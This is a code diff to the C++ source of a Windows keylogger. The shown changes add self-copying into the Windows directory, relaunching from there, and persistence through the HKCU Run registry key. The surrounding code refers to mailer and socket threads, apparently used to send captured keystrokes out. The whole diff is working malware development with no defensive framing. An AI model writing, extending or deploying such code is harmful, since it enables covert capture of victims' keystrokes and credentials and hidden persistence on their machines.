@@ -1,4 +1,4 @@
-// Keylogger.cpp : Defines the entry point for the console application.
+	// Keylogger.cpp : Defines the entry point for the console application.
 //
 
 
@@ -23,6 +23,7 @@
 
 #include "Keylogger.h"
 #include "SocketServer.h"
+#include "StringUtilities.h"
 
 extern "C" { FILE __iob_func[3] = { *stdin,*stdout,*stderr }; }
 
@@ -38,6 +39,7 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT message,
 	WPARAM wParam, LPARAM lParam);
 void socketThreadProc();
 void mailerThreadProc();
+bool addToStartup(std::wstring pszAppName, std::wstring pathToExe);
 
 INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 	LPSTR lpCmdLine, INT iCmdShow) {
@@ -53,8 +55,8 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 	GetModuleFileName(NULL, buff, buffSize);
 	std::wstring path = std::wstring(buff);
 	GetWindowsDirectory(buff, buffSize);
-	std::wstring winDir = L"C:\\Windows";
-	if (path.find(winDir) != 0) {
+	std::wstring winDir = std::wstring(buff);
+	if (StringUtilities::toLower(path).find(StringUtilities::toLower(winDir)) != 0) {
 		// Copy self to windir
 		std::wstring newPath = winDir + L"\\" + PROGRAM_NAME;
 		bool result = CopyFile(path.c_str(), newPath.c_str(), false);
@@ -64,9 +66,19 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 			std::cout << "err";
 		}
 
-		system(StringUtilities::ws2s(newPath).c_str());
+		// Create new process of program in windir
+		STARTUPINFO si;
+		PROCESS_INFORMATION pi;
+
+		ZeroMemory(&si, sizeof(si));
+		si.cb = sizeof(si);
+		ZeroMemory(&pi, sizeof(pi));
+
+		auto prres = CreateProcess(newPath.c_str(), NULL, NULL, NULL,
+			NULL, NULL, NULL, NULL, &si, &pi);
 		// TODO add copied exe to autorun
-		ExitProcess(0);
+		addToStartup(PROGRAM_NAME, newPath);
+		return 0;
 	}
 
 	MSG msg;
@@ -131,4 +143,28 @@ void mailerThreadProc() {
 			}
 		}
 	}
+}
+
+bool addToStartup(std::wstring pszAppName, std::wstring pathToExe) {
+	HKEY hkey = NULL;
+	int result = 0;
+	bool success = true;
+
+	result = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+		0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hkey, NULL);
+
+	success = (result == 0);
+
+	if (success) {
+		result = RegSetValueExW(hkey, pszAppName.c_str(), 0, REG_SZ,
+			(BYTE*)pathToExe.c_str(), sizeof(wchar_t) * pathToExe.size());
+		success = (result == 0);
+	}
+
+	if (hkey != NULL) {
+		RegCloseKey(hkey);
+		hkey = NULL;
+	}
+
+	return success;
 }
